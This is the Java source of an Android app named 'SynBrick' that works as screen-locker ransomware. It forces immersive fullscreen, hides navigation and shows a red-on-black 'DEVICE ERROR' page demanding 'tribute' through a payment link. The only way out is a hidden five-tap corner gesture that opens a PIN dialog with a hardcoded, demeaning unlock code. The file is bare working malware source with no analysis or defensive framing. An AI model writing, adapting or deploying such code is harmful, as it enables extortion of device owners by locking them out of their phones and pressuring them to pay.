package com.syn.brick;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.LinearLayout;

public class MainActivity extends Activity {

    private int tapCount = 0;
    private long lastTapTime = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        hideSystemUI();

        WebView webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.loadData(
                "<html><body style='background:black;color:red;text-align:center;font-size:24px;'>"
                        + "<br><br><br><br>⚠ DEVICE ERROR ⚠<br><br>System Overridden by SynBrick"
                        + "<br><br>Tribute required to restore functionality."
                        + "<br><br><b>https://throne.com/send2syn/item/e9084133-c957-4092-83b5-f8fdb65a999e</b>"
                        + "</body></html>",
                "text/html", "utf-8"
        );

        webView.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                if (event.getX() < 200 && event.getY() < 200) {  // upper-left corner
                    long now = System.currentTimeMillis();
                    if (now - lastTapTime < 1000) {
                        tapCount++;
                        if (tapCount >= 5) {
                            showPinDialog();
                        }
                    } else {
                        tapCount = 1;
                    }
                    lastTapTime = now;
                }
            }
            return false;
        });

        setContentView(webView);
    }

    private void showPinDialog() {
        EditText input = new EditText(this);
        input.setHint("Enter PIN");
        LinearLayout layout = new LinearLayout(this);
        layout.setPadding(50, 40, 50, 10);
        layout.addView(input);

        new AlertDialog.Builder(this)
                .setTitle("Unlock")
                .setView(layout)
                .setCancelable(false)
                .setPositiveButton("Unlock", (dialog, which) -> {
                    String pin = input.getText().toString();
                    if (pin.equals("slave4syn")) {
                        finish(); // Unlocks the screen
                    }
                })
                .setNegativeButton("Cancel", null)
                .show();
    }

    private void hideSystemUI() {
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
                View.SYSTEM_UI_FLAG_FULLSCREEN |
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        );
    }
}